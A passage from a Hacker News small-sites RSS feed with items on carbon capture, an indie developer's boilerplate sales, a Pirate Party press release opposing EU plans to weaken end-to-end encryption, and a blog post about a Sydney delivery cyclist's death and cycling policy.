-->transporting it to a storage site, and depositing it where it will not enter the atmosphere. Some could be used to help grow greenhouse plants, make plastics, or even carbonate fizzy drinks. The first step is to fit factory chimneys with solvent filters, which trap carbon emissions before they escape, then the gas can be piped to locations to be used or stored. For the moment, t<span>here are about 30 CCUS projects operating around the world, which is nowhere near enough to clean up all of our emissions. </span></span></p><h3 id="viewer-fds85"><span><span>Why is CCUS needed?</span></span></h3><p id="viewer-7vj3h"><span><span>Nowadays, </span>Industrial production <span>accounts for one-quarter of CO</span>2﻿<span> emissions from energy and industrial processes. With the demand for cement, steel and chemicals remaining strong to support a growing and increasingly urbanised global population, the future production of these materials will have to be more efficient and emit much less CO</span>2<span> if governments want to meet their climate goals.</span></span></p><p id="viewer-8ofv8"><span><span>In the </span><a href="https://www.iea.org/reports/material-efficiency-in-clean-energy-transitions" target="_blank" rel="noopener"><u>IEA's "Clean Technology Scenario"</u></a>, <span>more than 28 GtCO</span>2<span>﻿ could be captured from industrial facilities between now and 2060.</span></span></p><p id="viewer-5eiqn"><span><span>Carbon capture, usage and storage also offers several other potential benefits:</span></span></p><ul><li id="viewer-63jb1"><p><span>The ability to generate additional power thanks to </span><span>geologically stored CO</span>2 which<span> could be used to extract geothermal heat from the same locations in which it’s injected, producing renewable geothermal energy.</span></p></li><li id="viewer-bcq59"><p><span>CO2 can technically be turned into fuel, although it is rather difficult to achieve.</span></p></li><li id="viewer-dru7v"><p><span>Captured CO</span>2<span> could also be used to strengthen concrete, leading to increased infrastructure durability.</span></p></li></ul><div id="viewer-den6h"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.thedetechtor.com/post/carbon-capture-usage-and-storage-the-solution-to-the-climate-crisis" data-pin-media="https://static.wixstatic.com/media/f361a8_220f0481ef95495b80fcd23b618197f0~mv2.jpg/v1/fit/w_1000%2Ch_853%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/f361a8_220f0481ef95495b80fcd23b618197f0~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><h3 id="viewer-e8ds9"><span><span><strong>Suggested Articles:</strong></span></span></h3><ul><li id="viewer-apsbb"><p><strong>🚄 </strong><a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><strong><u>Hyperloop, the future of travel?</u></strong></a></p></li><li id="viewer-8crgb"><p><strong>⌚️ </strong><a href="https://www.thedetechtor.com/post/fitness-trackers-helping-us-get-fit-or-just-another-gadget" target="_blank" rel="noopener"><strong><u>Fitness Trackers: Helping us Get Fit or Just Another Gadget?</u></strong></a></p></li><li id="viewer-4jk2p"><p><strong>📱 </strong><a href="https://www.thedetechtor.com/post/smartphones-the-true-cost-of-upgrades" target="_blank" rel="noopener"><strong><u>Smartphones: The True Cost of Upgrades</u></strong></a><strong> ♻️ </strong></p></li></ul><h3 id="viewer-9j318"><span>What's the catch?</span></h3><p id="viewer-89c60"><span>CCUS has always been controversial, m<!-- -->ost people are either heavily in favour of CCUS technology or heavily against. There are several reasons why this technology might not be the best solution.</span></p><p id="viewer-3g635"><span>Environmentalists<!-- --> tend to see CCUS as a distraction from the need to convert to <!-- -->renewable energy as quickly as possible<!-- -->. Some argue that investing in carbon capture wasting money that could be put to better use, like perfecting <!-- -->solar energy<!-- -->, <!-- -->building insulation<!-- -->, <!-- -->wind turbines or even <!-- -->tidal power. </span></p><p id="viewer-bts9g"><span>Another drawback of carbon capture, usage and storage, is the considerable amount of extra power it requires, which would increase the cost of electricity. Talking of cost, CCUS technology is said to be very expensive, however, new methods for capturing and extracting CO2 are constantly being developed, always with the aim to become cheaper.</span></p><h3 id="viewer-3q94h"><span>Where is CCUS in place?</span></h3><p id="viewer-2ukm3"><span>There are currently almost 30 carbon capture, usage and storage projects in place around the world namely in the <span>US, Canada, Norway, China and the UK.</span></span></p><p id="viewer-4rv4i"><span><span>Here are some of the biggest projects:</span></span></p><ul><li id="viewer-65sfn"><p><span>The Century natural gas processing facility in West Texas, US. The capturing plant began operations in November 2010 and is now the world’s single biggest CCS plant.</span></p></li><li id="viewer-3iluh"><p>The Boundary Dam Carbon Capture and Storage (CCS) project located in Saskatchewan, Canada. Owned by SaskPower, the <span>Boundary Dam coal-fired plant located in Estevan, Saskatchewan began operations in 2014.</span></p></li><li id="viewer-3uhge"><p><span>The Shute Creek gas processing plant, located in Wyoming, US. The CCS facility, built near LaBarge, Lincoln County, is owned by ExxonMobil and captures approximately 365 million cubic feet per day of CO</span>2<span>, which is equivalent to removing more than 1.5 million cars off the road.</span></p></li></ul><div id="viewer-eol67"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img" aria-label="Photo of fumes, CO2 from an industrial plant."><p><img data-pin-url="https://www.thedetechtor.com/post/carbon-capture-usage-and-storage-the-solution-to-the-climate-crisis" data-pin-media="https://static.wixstatic.com/media/f361a8_e6bddda6d2d54b038510cf9aec5bc37a~mv2.jpg/v1/fit/w_1000%2Ch_851%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/f361a8_e6bddda6d2d54b038510cf9aec5bc37a~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg" alt="Photo of fumes, CO2 from an industrial plant."></p></div></div></div></div><h3 id="viewer-4dtjt"><span><span>The bottom line</span></span></h3><p id="viewer-1abo"><span><span>Despite the controversy, it seems that </span>carbon capture, usage and storage technology will become an important part of tackling the climate crisis. I think that if future projects aren't too expensive, it could definitely be a solution to this ever-growing problem, so long as it isn't to the expense of investing in renewable energy and other methods of reducing our CO2 emissions.</span></p><h3 id="viewer-6af0g"><span><span><strong>More from The Detechtor:</strong></span></span></h3><ul><li id="viewer-8a6vc"><p><strong>🚄 </strong><a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><strong><u>Hyperloop, the future of travel?</u></strong></a></p></li><li id="viewer-63fca"><p><strong>⌚️ </strong><a href="https://www.thedetechtor.com/post/fitness-trackers-helping-us-get-fit-or-just-another-gadget" target="_blank" rel="noopener"><strong><u>Fitness Trackers: Helping us Get Fit or Just Another Gadget?</u></strong></a></p></li><li id="viewer-anbaq"><p><strong>📱 </strong><a href="https://www.thedetechtor.com/post/smartphones-the-true-cost-of-upgrades" target="_blank" rel="noopener"><strong><u>Smartphones: The True Cost of Upgrades</u></strong></a><strong> ♻️</strong></p></li></ul><h3 id="viewer-4ja8h"><span><span>Stay updated:</span></span></h3><ul><li id="viewer-6j517"><p>📩 Want the latest on the impact of tech? <strong>Subscribe</strong> to our <strong>newsletter</strong>!</p></li><li id="viewer-91ucr"><p>🎙 <strong>NEW</strong>! <a href="http://thedetechtor.com/" target="_blank" rel="noopener"><u>The Detechtor Podcast</u></a> is now available on all podcast players!                                                      <strong>Subscribe</strong> on <a href="https://podcasts.apple.com/fr/podcast/the-detechtor-podcast/id1537457578?l=en" target="_blank" rel="noopener"><u>Apple Podcasts</u></a> | <a href="https://open.spotify.com/show/5kc8WA6nZC69bQ1sbOrlNi?si=CwAuAtpfRpe7WmLu1PlO8w" target="_blank" rel="noopener"><u>Spotify</u></a> | <a href="https://podcasts.google.com/search/The%20detechtor%20Podcast" target="_blank" rel="noopener"><u>Google Podcasts</u></a> | <a href="https://www.stitcher.com/show/the-detechtor-podcast" target="_blank" rel="noopener"><u>Stitcher</u></a> | <a href="https://tunein.com/podcasts/Technology-Podcasts/The-Detechtor-Podcast-p1377296/?topicid=158813573" target="_blank" rel="noopener"><u>Tunein</u></a></p></li><li id="viewer-3sf88"><p>📲 Let's connect! <strong>Follow</strong> <strong>us</strong> on <a href="https://twitter.com/the_detechtor" target="_blank" rel="noopener"><u>Twitter</u></a> | <a href="https://www.instagram.com/thedetechtor/" target="_blank" rel="noopener"><u>Instagram</u></a> | <a href="https://www.facebook.com/thedetechtor" target="_blank" rel="noopener"><u>Facebook</u></a> | <a href="https://www.youtube.com/channel/UCAW--4_mML4A86W3670ix3w" target="_blank" rel="noopener"><u>Youtube</u></a></p></li></ul></div></div></div></div></article></div></div>]]>
            </description>
            <link>https://www.thedetechtor.com/post/carbon-capture-usage-and-storage-the-solution-to-the-climate-crisis</link>
            <guid isPermaLink="false">hacker-news-small-sites-25196633</guid>
            <pubDate>Tue, 24 Nov 2020 09:04:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I went from $2k in a year to $2k in a week]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25196434">thread link</a>) | @jakeprins
<br/>
November 24, 2020 | https://jakeprins.com/blog/how-i-went-from-2k-in-a-year-to-2k-in-a-week | <a href="https://web.archive.org/web/*/https://jakeprins.com/blog/how-i-went-from-2k-in-a-year-to-2k-in-a-week">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><p>After many hours of work, it was finally time to give people access to my new project, a SaaS boilerplate. In the first 5 days of early access, I almost made $2k in sales ($1,901.40 to be exact).</p><p>I have made and sold a React boilerplate before, <a href="https://www.reactmilkshake.com/">React Milkshake</a>. In the week after launching React Milkshake I made just 29 dollars. I, later on, created upgraded versions of the boilerplate. Every new version sold a bit better than the previous one, but with my completely new project <a href="https://serverless.page/">Serverless SaaS</a> I have made more in one week than with all the previous projects combined in a year.</p><p>This didn’t just happen because I just got luckier this time. Here is what I did differently.</p><h3>Landing page before product building</h3><p>The first mistake I made in the previous projects was working by myself until it was time to launch. This meant I didn’t have an audience.</p><p>Inspired by the #BuildInPublic movement, I decided for my new project to first build <a href="https://serverless.page/">the landing page</a> and open up a mailing list so people could subscribe and follow the progress of me building the product. Every now and then I shared some updates and slowly grew the mailing list to over 100 people that were sincerely interested in what I was making.</p><h3>Blogging</h3><p>In the past, I had written some articles on Medium before, but I decided to at least write one or two new blog posts every month. In total, I have at least 10 new blog posts that are related to some of the technologies that are being used in <a href="https://serverless.page/">Serverless SaaS</a>. Most of them are tutorials like <a href="https://medium.com/better-programming/how-to-set-up-next-js-with-tailwind-css-b93ccd2d4164">How to setup Next.js with Tailwind</a> or <a href="https://medium.com/better-programming/how-to-implement-netlify-cms-with-next-js-4b8721bdec45">How to implement Netlify CMS with Next.js</a>, but also a series called <em>stack choices</em> in which I compare different frameworks or technologies with each other as <a href="https://codeburst.io/stack-choices-react-vs-vue-vs-angular-vs-svelte-49aa0170c634">Angular vs React vs Vue vs Svelte</a>.</p><p>Writing these blog posts had multiple purposes and ended up with benefits:</p><ul><li>Learned a lot about these subjects</li><li>Provided value for other people learning about these subject</li><li>Earned some money with the <a href="https://help.medium.com/hc/en-us/articles/115011694187-Getting-started-with-the-Medium-Partner-Program#h_01EECWD3WWHZTJMF5PTK7AAM2C">Medium Partner Program</a></li><li>Gave me the ability to drop a link to my new project</li><li>Gave me the ability to drop a link to my personal site and Twitter</li><li>Increased my followings on Medium</li></ul><p>The people who read my blog posts could also be future customers because the starter-kit is mainly for developers (or people who work with developers).</p><h3>Mailing list</h3><p>This time I had built up a mailing list with around 100 subscribers, all with people who were interested in the boilerplate. Around 50% opened the emails I had to send and around 30% clicked the links to the site. This list is still growing because I still allow people to sign up to get regular updates.</p><p>Besides that, I already had a personal mailing list of people who had signed up for previous products I have to build like <a href="https://codestash.co/">codestash</a>, <a href="https://www.makermove.com/">makermove</a>, and <a href="https://www.raterfox.com/">raterfox</a>.</p><p>Because I started blogging more I updated <a href="https://jakeprins.com/">my personal site</a> and also added a signup field for this personal mailing list to stay informed about blog posts or product updates. In total, I had around 1000 people on this list to send out an announcement, but just 20% of that list opened the email and only 2.5% clicked the link. Those numbers are not great, but most of these subscribers come from <a href="http://raterfox.com/">raterfox.com</a>, a social platform for entertainment, which is clearly not my target audience.</p><h3>Twitter</h3><p>Twitter is a great platform for talking in public about the process and updates on your products. I wasn’t very active on Twitter and mainly used it to stay informed about tech-related stuff. I decided to be more active and did manage to gain some more Twitter followers. I think the slow growth is caused mostly by being more active on not just Twitter, but also on Indie Hackers and mentioning <a href="https://twitter.com/jakeprins_nl">my handle</a> in blog posts.</p><p>With the current 581 followers, I do not believe this had a very big impact on my launch. Twitter seems great for people with a couple of thousands of followers, but with &lt; 1k followers it sometimes feels like you are talking to a black hole of nothing.</p><p>I still think it’s a great way to share your work and be reachable by others. Some people started to DM me with questions about the boilerplate. This was already a good sign. Also, people told me they were excited about the upcoming launch, even better! Besides that, someone reached out to say my guides online were really helpful, which is always great to hear.</p><h3>Building a better product</h3><p>The first boilerplate I had build, <a href="https://www.reactmilkshake.com/">React Milkshake</a>, was a bit of an experiment. I was using it myself and wasn’t sure if other people were going to pay for it. It was very basic and doesn’t have a lot of features when it launched, but the fact that people started to buy it was super exciting for me. It proved that people are willing to pay money for a starter-kit that helped them save time.</p><p>For my next project, <a href="https://serverless.page/">Serverless SaaS</a>, I decided to spend more time on it and take it to the next level. I had some proof of the market, but the product needed to provide more value.</p><p>Most Indiehackers and developers I met online were building SaaS apps. I also had some ideas for building a SaaS, so a boilerplate that could help me build new SaaS apps faster was very helpful. If the boilerplate wouldn’t sell, I could still use it myself. So I decided to implement multiple SaaS features, like a billing integration with Stripe, and market the product as a way to build SaaS apps faster.</p><p>This would be more aligned with the need for most of my target audience and also allows me to ask for a higher price. It provides much more value than my other boilerplates and people are also more willing to pay for products that help them save time or make money. This project could potentially do both.</p><p>Instead of rushing to market and going with a full-on MVP approach, I figured I should take my time and craft a product to be proud of. After that, I could soft launch it as “Early Access”, so I could ask my first customers for feedback and improve the product while it’s being used by actual paying customers. In this soft launch period, I made more money than I did in the last year of my old project, so I guess I’m doing something right.</p><h2>Conclusion</h2><p>After years of indie hacking, I have learned a lot of valuable lessons. Looking back at the months leading to the “soft” launch of my new product, I can tell that certain activities will highly increase your chances of a successful launch.</p><p>Building in public, by sharing your progress and thoughts on social platforms, could definitely help a lot.</p><p>Taking time to write articles and provide value to others helps you in building an audience and to connect with people that might end up being a customer.</p><p>Also, don’t rush the process of building a product. It can be helpful to launch fast and validate your idea as quickly as possible, but if you want to provide real value that could mean you need to put in some extra time. Once you have seen some proof of evidence that people are willing to pay for your product I think it’s good to not rush your project. Don’t put too much pressure on yourself. But, when you think that MVP is ready, just ship it.</p><p>Thanks for reading! You can find me on Twitter (<a href="https://twitter.com/jakeprins_nl">@jakeprins_nl</a>) or read more at <a href="https://jakeprins.com/blog">jakeprins.com/blog</a>.</p></article></div></div>]]>
            </description>
            <link>https://jakeprins.com/blog/how-i-went-from-2k-in-a-year-to-2k-in-a-week</link>
            <guid isPermaLink="false">hacker-news-small-sites-25196434</guid>
            <pubDate>Tue, 24 Nov 2020 08:26:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[EU on the Verge of Breaking E2ee]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25196420">thread link</a>) | @35803288
<br/>
November 24, 2020 | https://european-pirateparty.eu/pirates-call-for-clear-rejection-plans-to-break-secure-online-encryption/ | <a href="https://web.archive.org/web/*/https://european-pirateparty.eu/pirates-call-for-clear-rejection-plans-to-break-secure-online-encryption/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="entry-content" itemprop="text">
			    <p><span>Brussels, 11/11/2020 –&nbsp;On Monday</span><b> </b><span>the Austrian National Service Broadcaster (ORF) published a secret draft of a planned Council resolution seeking to undermine encryption. According to the resolution, messaging services such as Whatsapp are to allow governments to decrypt and intercept secure online communications. </span><span><b><strong>Pirates call on responsibility of representatives of the public services to uphold and protect the fundamental right to privacy as well as the security of our digital communications infrastructure. </strong></b></span></p>
<p><span><b><strong>We also call on YOU, Internet users, to contact their governments in advance of tomorrow’s deadline (12:00) for input.</strong></b></span></p>
<p><span>The proposal stands in line with regular attacks by governments on the secure encryption of content, made under the guise of the fight against organized crime and terrorism.</span></p>
<p><span>“There is no such thing as a ‘partial backdoor’ to online communications. The security of all our communications must be given priority. This has been the clear position of the European Parliament since 2017, and it is also the biggest priority of the Pirates,” says Marcel Kolaja, Pirate Vice-President of the European Parliament.&nbsp;</span></p>
<p><span>“Contrary to what governments would have us believe, we have to choose between interception and security. Those who want to sacrifice secure encryption in order to enable eavesdropping will destroy the protection of private secrets, business secrets and state secrets, and open the door to mass-spying by foreign intelligence services as well as hacker attacks,” explains Pirate Patrick Breyer, German MEP.</span></p>
<blockquote><p><span>“It is technically impossible to grant access to securely encrypted communications solely for ‘lawful’ purposes. As soon as messaging services allow for the decryption of private communications, for instance by implementing backdoors or providing master keys, the security of communications is broken once and for all – not only for the ‘legitimate’ purposes envisioned by the national governments,” adds Mikuláš Peksa, MEP and chairperson of European Pirate Party.&nbsp;</span></p></blockquote>
<p><span>“Contrary to what is argued by the Presidency, there is no middle-way between upholding the ‘fundamental rights and the digital security of governments, industry and society’ and the breaking of secure end-to-end encryption. Therefore, we demand strict rejection of the proposal by the national government’s representatives. We ask European citizens to help us now and contact their governments immediately,” stresses Markéta Gregorová, Czech Pirate MEP.&nbsp;</span></p>
<h2><span>That is why</span><span><strong>&nbsp;</strong></span><b><strong><span>we prepared the letters which can help you with contacting your Permanent&nbsp;<span>representations</span>&nbsp;of the EU</span></strong></b><span><span><strong>&nbsp;</strong></span></span><b><strong><span>in each country. Moreover, we translated the text into a few European languages. </span></strong></b></h2>
<h2><span>For every translation, we added the e-mail&nbsp;<span>address</span>&nbsp;of your specific Permanent representations of the EU. Feel free to use it and ask for redirecting the letter to the specific governments!</span></h2>
<p><strong>PS: DO NOT FORGET TO ADD YOUR SIGNATURE IN THE END OF THE LETTER.</strong></p>
<hr>
<p><a href="https://publisher.pp-eu.eu/static/ViewerJS/#/tmp/assets/doc/english.pdf">Main ENGLISH version of the letter.</a></p>
<p><a href="https://publisher.pp-eu.eu/static/ViewerJS/#/tmp/assets/doc/deutsch.pdf">GERMAN version</a> – send it to: <a href="mailto:info@bruessel-eu.diplo.de">info@bruessel-eu.diplo.de</a></p>
<p><a href="https://publisher.pp-eu.eu/static/ViewerJS/#/tmp/assets/doc/czech.pdf">CZECH version</a> – send it to: <a href="mailto:eu.brussels@embassy.mzv.cz">eu.brussels@embassy.mzv.cz</a></p>
<p><a href="https://publisher.pp-eu.eu/static/ViewerJS/#/tmp/assets/doc/french.pdf">FRENCH version</a> – send it to: <a href="mailto:courrier.bruxelles-dfra@diplomatie.gouv.fr">courrier.bruxelles-dfra@diplomatie.gouv.fr</a></p>
<p><a href="https://publisher.pp-eu.eu/static/ViewerJS/#/tmp/assets/doc/greek.pdf">GREEK version</a> – send it to: <a href="mailto:mea.bruxelles@rp-grece.be">mea.bruxelles@rp-grece.be</a></p>
<p><a href="https://publisher.pp-eu.eu/static/ViewerJS/#/tmp/assets/doc/slovak.pdf">SLOVAK version</a> – send it to: <a href="mailto:eu.brussels@mzv.sk">eu.brussels@mzv.sk</a></p>
<p><a href="https://publisher.pp-eu.eu/static/ViewerJS/#/tmp/assets/doc/spanish.pdf">SPANISH version</a> – send it to: <a href="mailto:reper.bruselasue@reper.maec.es">reper.bruselasue@reper.maec.es</a></p>
<p><a href="https://publisher.pp-eu.eu/static/ViewerJS/#/tmp/assets/doc/Italian.pdf">ITALIAN version</a> – send it to: <a href="mailto:rpue.rpue@esteri.it">rpue.rpue@esteri.it</a></p>
<p><a href="https://publisher.pp-eu.eu/static/ViewerJS/#/tmp/assets/doc/Estonian.pdf">ESTONIAN version</a> – send it to: <a href="mailto:permrep.eu@mfa.ee">permrep.eu@mfa.ee</a></p>
<p><a href="https://publisher.pp-eu.eu/static/ViewerJS/#/tmp/assets/doc/Icelandic.pdf">ICELANDIC version</a> – send it to: <a href="mailto:Delegation-Iceland@eeas.europa.eu">Delegation-Iceland@eeas.europa.eu</a></p>
			    			</div></div>]]>
            </description>
            <link>https://european-pirateparty.eu/pirates-call-for-clear-rejection-plans-to-break-secure-online-encryption/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25196420</guid>
            <pubDate>Tue, 24 Nov 2020 08:24:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[5th UberEats cyclist killed in Sydney in 3 months: Analysis and photos]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25196375">thread link</a>) | @jakecopp
<br/>
November 24, 2020 | https://jakecoppinger.blog/articles/the-last-delivery-of-an-ubereats-cyclist-2020/ | <a href="https://web.archive.org/web/*/https://jakecoppinger.blog/articles/the-last-delivery-of-an-ubereats-cyclist-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Last updated: November 24th, 2020. Please leave comments on <a href="https://news.ycombinator.com/item?id=25196375">Hacker News</a> (&gt;6 comments).</p>

<p><strong>Content warning</strong>: Description of a death, and photos of the cleaned site of death.</p>
<p>After <a href="https://www.theguardian.com/business/2020/nov/23/death-of-sydney-uber-eats-rider-the-fourth-food-delivery-fatality-in-two-months">four cyclists were killed by car drivers in Sydney in the last 2 months</a>, a <a href="https://www.abc.net.au/news/2020-11-24/uber-eats-vows-to-improve-safety-cyclist-killed-in-inner-sydney/12913840">37-year-old man from Malaysia</a> was killed at ~6:40pm last night - on my street, 200 metres from my front door, at an intersection I cycle through 2-4 times a day. I would have gone through that intersection within 15 minutes of that time if I didn’t skip a class. If you know me, I’m usually quite outspoken about the dangers cyclists face, but this was absolutely brutal to hear.</p>
<p>They cleaned up the body, but didn’t completely clean up the UberEats meal the man was delivering. The man likely died while earning less than minimum wage - A survey conducted by the Transport Workers’ Union in September <a href="https://www.theguardian.com/business/2020/nov/23/death-of-sydney-uber-eats-rider-the-fourth-food-delivery-fatality-in-two-months">found</a> that food deliverers earned an average of just $10.42 an hour after costs. 73% said they were worried about being “seriously hurt or killed” at work.</p>
<p><em>Content warning: Image of scattered food on road, blue glove likely from police investigation.</em></p>
</div><div>
<p>An <a href="https://www.reddit.com/r/sydney/comments/jzewgi/fifth_food_delivery_rider_dies_following_truck/gdbm0s4/?utm_source=reddit&amp;utm_medium=web2x&amp;context=3">eyewitness account on Reddit</a>:</p>
<blockquote>
<p>…I was driving along Cleveland st, and only had a glimpse of what happened: for those of you arguing about PPE - I think there was a helmet - and a crushed head and body, and a twisted bicycle, and, yes, one of those grey food delivery bags all in the middle of Chalmers st. I am crying tonight, because that was someone’s child, friend … a person - who is no more… .</p>
</blockquote>
<p><em>Content warning: Image of fragment of the helmet of the cyclist in the road gutter.</em></p>
</div><div>
<h2 id="contributing-causes">Contributing causes</h2>
<p>This is a tragedy in itself, but there are also a number of contributing causes at play here:</p>
<ul>
<li><p>In NSW, cycling on a footpath <a href="https://bicyclensw.org.au/who-can-ride-on-a-footpath-in-nsw/">is illegal and carries a fine of $114</a> for those above 15 years of age. Footpath cycling is <a href="https://www.bykbikes.com.au/blogs/bike-riding-tips/riding-bikes-on-the-footpath-the-laws-for-kids-and-adults-in-australia">legal in</a> Queensland, Tasmania, the ACT, the Northern Territory and South Australia.</p>
<ul>
<li>In the UK in 2017, there is a cyclist/pedestrian collision every <a href="https://www.cyclingweekly.com/news/rise-pedestrians-hit-cyclists-not-cause-leap-conclusions-396047">~9.9 million kilometres walked by a pedestrian</a>, or 531 in total. Of these 531 collisions 3 people were killed.</li>
</ul></li>
<li><p>Gig economy workers have little training and often no insurance. California recently proposed a law to force Uber and other platforms to treat their workers like employees. It narrowly failed to pass after <a href="https://jakecoppinger.blog/articles/the-last-delivery-of-an-ubereats-cyclist-2020/Uber,%20Lyft,%20and%20DoorDash%20poured%20over%20$200%20million%20into">Uber, Lyft and Doordash spent &gt; US$200m</a> campaigning against the law.</p></li>
<li><p>Dedicated infrastructure for cyclists is rare in Sydney. Not only are separated bicycle lanes hard to come by, a state government <a href="https://concreteplayground.com/sydney/design-style/sustainability/state-goverment-moves-to-rip-up-college-street-cycleway">actively removed</a> a cycleway in 2015 (which <a href="https://www.dailytelegraph.com.au/newslocal/central-sydney/college-st-syclists-four-times-as-likely-to-be-involved-in-a-crash-since-cycleway-removed/news-story/98ebe30e5c649407e45fd1aa7f023049">increased accidents by 400%</a>) <a href="https://www.bicyclenetwork.com.au/newsroom/2019/03/12/planned-removal-of-alexandra-canal-cycleway/">and in 2019</a>. Walking and cycling infrastructure typically receives <a href="https://theconversation.com/cycling-and-walking-can-help-drive-australias-recovery-but-not-with-less-than-2-of-transport-budgets-142176">0.1-2% of transport budgets</a>. Clover Moore is pushing hard on adding new dedicated cycle infrastructure in the City of Sydney - <a href="https://www.cityofsydney.nsw.gov.au/building-new-infrastructure/creating-pop-up-cycleways-in-sydney">Six pop-up cycleways</a> have been added, which may remain if their is popular support.</p></li>
<li><p>Australian car drivers have a <a href="https://www.abc.net.au/triplej/programs/hack/mythbusting-the-reasons-why-people-hate-cyclists/8689058">unique hatred of cyclists</a>. Cyclists <a href="https://www.smh.com.au/lifestyle/youre-a-cyclist-so-its-your-fault-20140205-321np.html">attract a level of vitriol</a>, if not outright malice, reserved for few subjects in the laid back Aussie’s mind. Even Tour de France winner Cadel Evans, a self described “car guy” who has a number of classic and sports cars, said <a href="https://www.smh.com.au/entertainment/books/even-tour-de-france-winner-cadel-evans-finds-cycling-in-sydney-too-intimidating-20161118-gss316.html">he doesn’t cycle in Sydney</a> due to the culture. Cyclists want to be on the road even less than car drivers want them there, but as stated earlier it is illegal to cycle on the footpath.</p></li>
</ul>
<p><em>Content warning: Image of the street where event took place, recognisable to those who live in Sydney.</em></p>
</div><div>
<h2 id="reasons-for-change">Reasons for change</h2>
<h3 id="public-safety">Public safety</h3>
<p>Car crashes are one of the <a href="https://www.seattletimes.com/life/lifestyle/the-most-dangerous-activity-driving/">leading causes of death in western countries</a>, and air pollution due to cars killed <a href="https://www.smh.com.au/politics/federal/road-death-toll-should-include-victims-of-vehicle-emissions-report-20190628-p522a8.html">two times</a> as many people as <a href="https://roadsafety.transport.nsw.gov.au/statistics/index.html">crashes do</a> in NSW each year - and they didn’t even have a choice. <a href="http://publications.jrc.ec.europa.eu/repository/bitstream/JRC89231/jrc89231-online%20final%20version%202.pdf">Half of PM10 particle emissions come from tire wear, suspended road dust and brake wear</a>- electric cars (even with regen braking) won’t fix this. In the US, drivers of cars <a href="http://vpc.org/regulating-the-gun-industry/gun-deaths-compared-to-motor-vehicle-deaths/">kill more people</a> than guns each year.</p>
<p>NSW has a program called <a href="https://towardszero.nsw.gov.au/">Towards Zero</a>, with the aim of reducing road fatalities to zero. One of the few cities to achieve this goal is Oslo, which <a href="https://twitter.com/andershartmann/status/1212465415743512576">reduced pedestrian and cyclist deaths in 2019 to 0</a> by making the <em>city centre</em> <a href="https://www.fastcompany.com/90294948/what-happened-when-oslo-decided-to-make-its-downtown-basically-car-free">effectively car free</a>, replacing more than 700 parking spots with bike lanes, plants, parks and benches, increasing business.</p>
<p><em>Content warning: Image of food on the tarmac, and diffracted reflection from fluid likely used to clean the road.</em></p>
</div><div>
<h3 id="cars-are-heavily-subsidised-in-australia">Cars are heavily subsidised in Australia</h3>
<p>By the most generous measure, drivers only contribute <a href="https://www.ptua.org.au/myths/petroltax/">two-thirds of the cost of the road system</a> through rego and petrol taxes. The damage to a road is proportional to the <em>fourth power</em> of axle weight. Many cyclists also own a car and already pay rego. Contrary to popular belief, cyclists are likely subsidising car users.</p>
<h3 id="investing-in-cycle-infrastructurereducing-car-usage-makes-economic-sense">Investing in cycle infrastructure/reducing car usage makes economic sense</h3>
<p>In one study, for each dollar of investment in cycle focused infrastructure, the best practice policy returns 24 dollars in health, congestion, and air and noise pollution related benefits (<a href="https://ec.europa.eu/environment/integration/research/newsalert/pdf/378na1_en.pdf">Macmillan, A., Connor, J., Witten, K., et al.&nbsp;(2014). The Societal Costs and Benefits of Commuter Bicycling: Simulating the Effects of Specific Policies Using System Dynamics Modeling</a>)</p>
<p>A paper submitted to Infrastructure Australia estimated the value of commuter cycling in Australian capital cities as worth approximately <a href="https://www.infrastructureaustralia.gov.au/sites/default/files/2019-06/Cycling_Infrastructure_Background_Paper_16Mar09_WEB.pdf">$0.76 per kilometre travelled</a>, equating to $2,667 for each regular commuter. Another paper <a href="https://www.infrastructureaustralia.gov.au/sites/default/files/2019-06/Cycling_Infrastructure_Background_Paper_16Mar09_WEB.pdf">estimated</a> that converting drivers to cycling in Sydney &amp; Brisbane is worth $0.74 per kilometre, $1,920 per person annually in inner Sydney.</p>
<p>Banning cars on a street in Rome led to <a href="https://jakecoppinger.blog/articles/the-last-delivery-of-an-ubereats-cyclist-2020/www.theguardian.com/cities/2015/mar/13/pedestrianisation-rome-italy-car-parking-ban">30% increase</a> in retail spending in that street.</p>
<p>There are <a href="https://cityobservatory.org/ten-things-more-inequitable-that-road-pricing/">a lot of things</a> in our current system more inequitable than road pricing in urban areas.</p>
<h3 id="a-lot-of-other-cities-are-reducing-car-usage">A lot of other cities are reducing car usage</h3>
<p>I know this argumentum ad populum, but hey.</p>
<p>The following cities have a <a href="https://en.wikipedia.org/wiki/Congestion_pricing">congestion tax</a> in their urban core:</p>
<ul>
<li><a href="https://theconversation.com/london-congestion-charge-what-worked-what-didnt-what-next-92478">London</a></li>
<li><a href="https://en.wikipedia.org/wiki/Congestion_pricing_in_New_York_City">New York</a> (soon)</li>
<li>Stockholm</li>
<li>Singapore</li>
<li>Milan</li>
<li>Gothenburg</li>
</ul>
<p>Other efforts to reduce car usage:</p>
<ul>
